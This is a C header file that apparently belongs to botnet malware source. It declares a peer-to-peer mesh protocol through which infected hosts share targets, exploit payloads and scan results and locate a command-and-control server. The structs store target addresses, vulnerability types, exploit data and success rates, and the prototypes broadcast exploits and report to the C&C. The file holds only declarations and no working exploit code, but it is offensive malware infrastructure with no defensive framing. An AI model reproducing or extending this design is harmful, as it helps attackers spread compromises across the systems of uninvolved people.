#pragma once
#include "includes.h"
#include <stdint.h>
#define P2P_MAX_PEERS 50
#define P2P_MESH_PORT 13337
#define P2P_MESSAGE_MAX_SIZE 4096
#define P2P_MSG_PING 1              
#define P2P_MSG_PONG 2              
#define P2P_MSG_TARGET_INFO 3      
#define P2P_MSG_EXPLOIT_SHARE 4     
#define P2P_MSG_SCAN_RESULT 5       
#define P2P_MSG_CNC_DISCOVERY 6     
#define P2P_MSG_SYNC_REQUEST 7      
#define P2P_MSG_SYNC_RESPONSE 8     
struct p2p_peer {
    ipv4_t ip;
    uint16_t port;
    uint32_t last_seen;
    uint8_t version;
    uint32_t uptime;
    char arch[16];
    BOOL active;
};
struct p2p_message {
    uint8_t type;
    uint16_t length;
    uint32_t timestamp;
    ipv4_t sender_ip;
    uint16_t sender_port;
    char data[P2P_MESSAGE_MAX_SIZE];
};
struct target_info {
    ipv4_t target_ip;
    uint16_t target_port;
    uint8_t protocol;
    uint8_t vulnerability_type;
    char exploit_data[1024];
    uint16_t exploit_size;
    uint32_t success_rate;
    uint32_t last_tested;
};
void p2p_mesh_init(void);
void p2p_mesh_start(void);
void p2p_mesh_stop(void);
void p2p_mesh_broadcast_target_info(struct target_info *info);
void p2p_mesh_broadcast_exploit(const char *exploit_data, uint16_t size, ipv4_t target_ip, uint16_t target_port);
void p2p_mesh_broadcast_scan_result(ipv4_t target_ip, uint16_t target_port, uint8_t protocol, const char *details);
void p2p_mesh_discover_cnc(void);
struct p2p_peer *p2p_mesh_get_peers(uint32_t *count);
struct target_info *p2p_mesh_get_intelligence_queue(uint32_t *count);
void p2p_mesh_report_to_cnc(void); 
void p2p_mesh_handle_message(struct p2p_message *msg);
